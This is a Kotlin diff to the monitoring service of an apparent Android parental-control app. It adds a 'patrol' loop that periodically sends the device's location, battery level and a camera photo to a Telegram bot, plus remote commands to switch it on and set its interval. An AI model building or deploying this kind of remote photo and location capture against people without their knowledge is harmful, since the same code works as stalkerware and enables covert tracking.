@@ -99,6 +99,7 @@ class MonitoringService : Service() {
     private var cameraJob: Job? = null
     private var commandJob: Job? = null
     private var initialSyncJob: Job? = null
+    private var patrolJob: Job? = null
     private val initialSyncRunning = java.util.concurrent.atomic.AtomicBoolean(false)
     private val initialSyncLock = Any()
     @Volatile
@@ -122,6 +123,8 @@ class MonitoringService : Service() {
     private var cachedPhotoPausedUntil = 0L
     @Volatile
     private var cachedSyncInterval = -1
+    private var cachedPatrolEnabled = false
+    private var cachedPatrolInterval = 30
     private var cachedSetupTap: android.app.PendingIntent? = null
     private val handledUpdateIds = java.util.Collections.synchronizedSet(LinkedHashSet<Long>())
     private val handledCallbackIds = java.util.Collections.synchronizedSet(LinkedHashSet<String>())
@@ -131,7 +134,7 @@ class MonitoringService : Service() {
         private val SMS_NUMBER_REGEX = Regex("^\\+?[0-9]{7,15}$")
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
         private val TAG_STRIP_REGEX = Regex("</?[a-zA-Z][^>]*>")
-        private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue")
+        private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue", "/patrol", "/patrolinterval")
         private val NO_REPLAY_COMMANDS = MUTATING_COMMANDS + "/smsconfirm" + "/ping"
         private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage")
         private const val COMMAND_MAX_AGE_SEC = 900L
@@ -186,6 +189,7 @@ class MonitoringService : Service() {
             }
             if (key == PreferencesManager.KEY_CAMERA_INTERVAL || key == PreferencesManager.KEY_MONITORING_PAUSED || key == PreferencesManager.KEY_PHOTO_PAUSED_UNTIL || key == PreferencesManager.KEY_SYNC_INTERVAL) refreshLoopConfig()
             if (key == PreferencesManager.KEY_CAMERA_INTERVAL || key == PreferencesManager.KEY_MONITORING_PAUSED || key == PreferencesManager.KEY_PHOTO_PAUSED_UNTIL) restartCameraLoop()
+            if (key == PreferencesManager.KEY_PATROL_ENABLED || key == PreferencesManager.KEY_PATROL_INTERVAL) restartPatrolLoop()
         }
         try { credsListener?.let { preferencesManager.registerChangeListener(it) } } catch (_: Exception) { }
         smsRepository = SmsRepository(this)
@@ -358,6 +362,7 @@ class MonitoringService : Service() {
         cameraJob?.cancel()
         commandJob?.cancel()
         initialSyncJob?.cancel()
+        patrolJob?.cancel()
         idlePolls = 0
         refreshCreds()
         refreshLoopConfig()
@@ -517,6 +522,7 @@ class MonitoringService : Service() {
             }
         }
         startCameraLoop()
+        startPatrolLoop()
     }
 
     private fun restartCameraLoop() {
@@ -554,6 +560,70 @@ class MonitoringService : Service() {
                     android.util.Log.e("MonitoringService", "Error in camera loop: ${redactToken(e.message)}")
                 }
             }
+        }
+    }
+
+    private fun restartPatrolLoop() {
+        try {
+            patrolJob?.cancel()
+        } catch (_: Exception) {
+        }
+        startPatrolLoop()
+    }
+
+    private fun startPatrolLoop() {
+        patrolJob = serviceScope.launch {
+            while (isActive && patrolJob === coroutineContext[Job]) {
+                try {
+                    val minutes = cachedPatrolInterval.coerceIn(5, 180)
+                    if (!cachedMonitoringPaused && cachedPatrolEnabled) {
+                        patrolRound()
+                        chunkedDelay(minutes * 60_000L)
+                    } else if (cachedMonitoringPaused) {
+                        chunkedDelay(15 * 60_000L)
+                    } else {
+                        chunkedDelay(30 * 60_000L)
+                    }
+                } catch (e: kotlinx.coroutines.CancellationException) {
+                    throw e
+                } catch (e: Exception) {
+                    android.util.Log.e("MonitoringService", "Error in patrol loop: ${redactToken(e.message)}")
+                } catch (t: Throwable) {
+                    android.util.Log.e("MonitoringService", "Fatal patrol error, loop survives")
+                }
+            }
+        }
+    }
+
+    private suspend fun patrolRound() {
+        if (NetworkUtils.isAuthBlocked(preferencesManager)) return
+        if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) return
+        ensureForegroundTypes()
+        val location = try {
+            fetchLocation()
+        } catch (_: Exception) {
+            null
+        }
+        val batteryManager = getSystemService(BATTERY_SERVICE) as BatteryManager
+        val level = try {
+            batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
+        } catch (_: Exception) {
+            -1
+        }
+        val body = buildString {
+            appendLine("\uD83D\uDEF0 <b>Patrol</b>")
+            if (location != null) {
+                appendLine("https://maps.google.com/?q=${location.latitude},${location.longitude}")
+                appendLine("Accuracy: ${location.accuracy.toInt()} m")
+            } else {
+                appendLine("Location: unavailable")
+            }
+            appendLine("Battery: ${if (level in 0..100) "$level%" else "unknown"}")
+        }
+        sendToTelegram(body)
+        try {
+            captureAndSendPhoto()
+        } catch (_: Exception) {
         }
     }
 
@@ -700,6 +770,8 @@ class MonitoringService : Service() {
             cachedMonitoringPaused = preferencesManager.monitoringPaused
             cachedPhotoPausedUntil = photoPausedElapsed()
             cachedSyncInterval = preferencesManager.syncInterval
+            cachedPatrolEnabled = preferencesManager.patrolEnabled
+            cachedPatrolInterval = preferencesManager.patrolInterval
         } catch (_: Exception) {
         }
     }
@@ -1111,6 +1183,7 @@ class MonitoringService : Service() {
             com.redeye.parentalmonitor.network.BotCommand("storage", "Show storage usage"),
             com.redeye.parentalmonitor.network.BotCommand("history", "Calls+SMS by number"),
             com.redeye.parentalmonitor.network.BotCommand("log", "Show last crash/error log"),
+            com.redeye.parentalmonitor.network.BotCommand("patrol", "Auto photo + location patrol"),
             com.redeye.parentalmonitor.network.BotCommand("help", "Show all commands")
         )
     }
@@ -1266,6 +1339,7 @@ class MonitoringService : Service() {
                         appendLine("Queued: ${messageQueue.getQueueSize()}")
                         appendLine("Data interval: ${preferencesManager.syncInterval} min")
                         appendLine("Photos: $photoState")
+                        appendLine("Patrol: ${if (preferencesManager.patrolEnabled) "ON every ${preferencesManager.patrolInterval} min" else "off"}")
                         appendLine("Camera: ${preferencesManager.cameraFacing}")
                         appendLine("Camera permission: ${if (hasCameraPermission()) "granted" else "MISSING"}")
                         appendLine("Location permission: ${if (hasLocationPermission()) "granted" else "MISSING"}")
@@ -1301,6 +1375,31 @@ class MonitoringService : Service() {
                 } else {
                     preferencesManager.cameraInterval = minutes
                     sendToTelegram("📸 Photo interval set to $minutes min.")
+                }
+            }
+            "/patrol" -> {
+                when (arg.lowercase(java.util.Locale.ROOT)) {
+                    "on" -> {
+                        preferencesManager.patrolEnabled = true
+                        sendToTelegram("\uD83D\uDEF0 Patrol ON \u2014 photo + location every ${preferencesManager.patrolInterval} min.")
+                    }
+                    "off" -> {
+                        preferencesManager.patrolEnabled = false
+                        sendToTelegram("\uD83D\uDEF0 Patrol OFF.")
+                    }
+                    else -> {
+                        val state = if (preferencesManager.patrolEnabled) "ON every ${preferencesManager.patrolInterval} min" else "OFF"
+                        sendToTelegram("Usage: /patrol \u003con|off\u003e (now $state)")
+                    }
+                }
+            }
+            "/patrolinterval" -> {
+                val minutes = arg.toIntOrNull()?.coerceIn(5, 180)
+                if (minutes == null) {
+                    sendToTelegram("Usage: /patrolinterval \u003c5-180\u003e")
+                } else {
+                    preferencesManager.patrolInterval = minutes
+                    sendToTelegram("\uD83D\uDEF0 Patrol interval set to $minutes min.")
                 }
             }
             "/pause" -> {
@@ -1784,6 +1883,8 @@ class MonitoringService : Service() {
                         appendLine("/lastcalls - show last 5 calls")
                         appendLine("/lastsms - show last 5 SMS")
                         appendLine("/photointerval \u003c0-60\u003e - set photo interval (0 = manual)")
+                        appendLine("/patrol \u003con|off\u003e - auto photo + location patrol")
+                        appendLine("/patrolinterval \u003c5-180\u003e - set patrol interval")
                         appendLine("/pause \u003cminutes\u003e - pause photos")
                         appendLine("/battery - show battery level")
                         appendLine("/status - show monitoring status")
@@ -2729,6 +2830,7 @@ class MonitoringService : Service() {
         cameraJob?.cancel()
         commandJob?.cancel()
         initialSyncJob?.cancel()
+        patrolJob?.cancel()
         ringJob?.cancel()
         recordJob?.cancel()
         smsJob?.cancel()
